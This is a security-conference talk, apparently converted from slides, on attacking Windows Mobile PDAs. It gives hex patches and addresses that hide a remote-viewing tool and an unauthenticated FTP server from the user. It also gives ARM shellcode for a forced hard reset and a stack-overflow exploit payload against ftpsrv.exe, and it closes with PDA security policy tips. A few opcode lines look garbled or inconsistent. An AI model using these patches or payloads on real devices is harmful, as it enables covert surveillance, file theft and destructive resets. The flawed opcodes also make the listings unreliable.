# The Invisible Spy and Hidden FTP Server: A Comprehensive Analysis

## 1. The Invisible Spy

### 1.3 Minimize and ShowWindow/UpdateWindow Functions

- **Minimize (0x10000000 and 0x20000000)**
  - **Assembly Code:**
    ```assembly
    MOV R3, #0x10000000
    MOV R3, #0x20000000
    ```
  - **Hexadecimal Representation:**
    ```
    01 32 A0 E3
    02 32 A0 E3
    ```
  - **Address:**
    ```
    0001210C
    150C
    ```

- **ShowWindow (BL ShowWindow, Virtual NOP)**
  - **Assembly Code:**
    ```assembly
    BL ShowWindow
    MOV R0, R0  ; Virtual NOP
    ```
  - **Hexadecimal Representation:**
    ```
    A6 15 00 EB
    00 00 A0 E1
    ```
  - **Address:**
    ```
    0001219C
    159C
    ```

- **UpdateWindow (BL UpdateWindow, Virtual NOP)**
  - **Assembly Code:**
    ```assembly
    BL UpdateWindow
    MOV R0, R0  ; Virtual NOP
    ```
  - **Hexadecimal Representation:**
    ```
    A1 15 00 EB
    00 00 A0 E1
    ```
  - **Address:**
    ```
    000121A4
    15A4
    ```

### 1.4 Features and Mitigation

- **Features:**
  - Full hidden remote viewing/control.
  - Alerting feature when on WLAN/LAN.
  - Can be easily placed in the Windows\Startup folder.

- **Mitigation:**
  - Firewall.
  - Monitor running processes.
  - Not a true virus; antivirus is ineffective.

- **Remote File Access:**
  - The Hidden FTP Server.

## 2. The Hidden FTP Server

### 2.1 Overview

- **Ftpsrv.exe:**
  - No authentication.
  - Does not show up in program memory listing.
  - Full access to PDA files.
  - Visible icon and defaulted to port 21.

### 2.2 Shell_NotifyIcon Functions

- **Shell_NotifyIcon (Add, Modify, Delete)**
  - **Function Prototype:**
    ```c
    BOOL Shell_NotifyIcon(
        DWORD dwMessage,
        PNOTIFYICONDATA pnid
    );
    ```
  - **dwMessage:**
    - `NIM_ADD` (0)
    - `NIM_MODIFY` (1)
    - `NIM_DELETE` (2)

- **Shellapi.h Definitions:**
  ```c
  #define NIM_ADD 0
  #define NIM_MODIFY 1
  #define NIM_DELETE 2
  ```

- **Shell_NotifyIcon Create (00013AC8)**
  - **Assembly Code:**
    ```assembly
    BL Shell_NotifyIcon
    MOV R0, R0  ; Virtual NOP
    ```
  - **Hexadecimal Representation:**
    ```
    3A 01 00 EB
    00 00 A0 E1
    ```
  - **Address:**
    ```
    00013AC8
    2EC8
    ```

- **Shell_NotifyIcon Delete (00013B18)**
  - **Assembly Code:**
    ```assembly
    BL Shell_NotifyIcon
    MOV R0, R0  ; Virtual NOP
    ```
  - **Hexadecimal Representation:**
    ```
    26 01 00 EB
    00 00 A0 E1
    ```
  - **Address:**
    ```
    00013B18
    2F18
    ```

- **Change Port (0001694C)**
  - **Hexadecimal Representation:**
    ```
    454C
    ```

### 2.3 Features and Mitigation

- **Features:**
  - Full hidden remote file access.
  - Can be easily placed in the Windows\Startup folder.

- **Mitigation:**
  - Firewall.
  - Monitor running processes.
  - Not a true virus; antivirus is ineffective.

- **Remote Malicious Attacks:**
  - Potential for remote malicious attacks.

## 3. Hard Reset Code

### 3.1 Assembly Code

- **Assembly Instructions:**
  ```assembly
  LDR R0, =SetCleanRebootFlag  ; Set R0 = Clean Reboot Flag
  LDR R1, [R0]                ; Load R1 with value in R0
  MOV LR, PC                  ; Move PC to LR
  MOV PC, R1                  ; Move R1 to PC
  MOV R3, #0                  ; R3 = 0
  STR R3, [SP,#4]             ; Store R3 at SP + 4
  MOV R0, #0                  ; R0 = 0
  STR R0, [SP]                ; Store R0 at SP
  MOV R3, #0                  ; R3 = 0
  MOV R2, #0                  ; R2 = 0
  MOV R1, #0                  ; R1 = 0
  LDR R0, =0x101003C          ; R0 = IOCTL_HAL_REBOOT
  LDR R4, =KernelIoControl     ; R4 = KernelIoControl Function Addr
  LDR R4, [R4]                ; Load R4 with value in R4 Addr
  MOV LR, PC                  ; Move PC to LR
  MOV PC, R4                  ; Reset!
  ```

### 3.2 Hard Reset Code Injection

- **FTP Servers:**
  - Known for buffer overflows.
  - Vulnerable to `mkdir`, `cd`, etc. via unchecked `strcpy`.
  - Overwrite PC (return address) register.
  - Standard 'Smash stack' overflow.
  - Hard reset code injection?

## 4. FTP Buffer Overflow

### 4.1 Subroutine Analysis

- **sub_12F28 (demo AAAAA)**
  - **Assembly Code:**
    ```assembly
    ldmia sp!, {r4 - r6, pc}
    ```
  - **Stack Pointer (SP):** 0007FB28
  - **Program Counter (PC):** 0007FB34

- **Unabridged Reset Code:**
  - `0x00` not allowed; convert all `00` to `01`.
  - Use AND operation:
    ```assembly
    MOV R1, #1
    AND R1, R1, 0xF0
    ```
  - Replace all `0x01` with `0x00`.

### 4.2 Assembly Code for Buffer Overflow

- **Assembly Instructions:**
  ```assembly
  E3A01001  ; MOV R1, #1
  E20110F0  ; AND R1, R1, 0xF0
  E5CF102C  ; STRB R1, PC, 2C
  E5CF1029  ; STRB R1, PC, 2C
  E5CF1028  ; STRB R1, PC, 2C
  E5CF1025  ; STRB R1, PC, 2C
  E5CF1025  ; STRB R1, PC, 2C
  E5CF1024  ; STRB R1, PC, 2C
  E5CF1024  ; STRB R1, PC, 2C
  E5CF1024  ; STRB R1, PC, 2C
  E5CF1025  ; STRB R1, PC, 2C
  E5CF1031  ; STRB R1, PC, 2C
  ```

### 4.3 Demo

- **Assembly Instructions:**
  ```assembly
  E59F1034  ; LDR R1, PC+34
  E1A0E00F  ; MOV LR, PC
  E1A0FO01  ; MOV PC, R1
  E3A00101  ; MOV R0, 0
  E58D0101  ; STR R0, SP
  E58D0104  ; STR R0, SP+4
  E3A03001  ; MOV R3, 0
  E3A02001  ; MOV R2, 0
  E3A01001  ; MOV R1, 0
  E59F0108  ; LDR R0, PC+8
  E59F4008  ; LDR R4, PC+8
  E1A0E00F  ; MOV LR, PC
  E1A0F004  ; MOV PC, R4
  0101013C  ; IOCTL_HAL_REBOOT
  01F730FC  ; DATA
  01F74F74  ; DATA
  ```

### 4.4 Challenges

- **Challenges:**
  - Offset value not static.
  - Value for reset not static (OEM & OS).
  - Variations between Dell and iPAQ.
  - Different Windows CE versions (minor and major).
  - Ftpsrv.exe always crashes, but PDA doesnâ€™t always reset.

## 5. PDA Best Practices

### 5.1 PDA Policy

- **Understand Device Usage:**
  - Who needs it (CEO, IT Admins)?
  - What will they use it for (email, contacts, task list)?
  - Why will they use it (cool toy, productivity)?
  - Where will they use it (home, work, on the road)?
  - How does it need to be protected?

### 5.2 PDA Security Tips

- **Enterprise Managed and Owned PDA:**
  - Control amount/type of data stored.
  - Encrypt all sensitive data.
  - Strong password (default four-digit PIN is weak).
  - Data wipe feature.
  - Encrypted and secure synchronization.
  - Use VPN, SSH, SSL, X.509 certificates, Smartcard.
  - Logging ability.
  - Firewall and AV.
  - Regular backups.

## Summary

- **Conclusion:**
  - PDAs, particularly those running Windows Mobile, are not secure.
  - Any questions?

- **Contact Information:**
  - PI:EMAIL

## References

- [ARM Documentation](http://www.arm.com)
- [GBA ARM Reference](http://www.ngine.de/gbadoc/armref.pdf)
- [ARM7TDMI Technical Reference Manual](http://www.eecs.umich.edu/speech/docs/arm/ARM7TDMIvE.pdf)
- [Kaos.net](http://www.kaos.net)
- Samija, Gerard Ivan. (2004) *Downloadable Threats to Pocket PC Data*.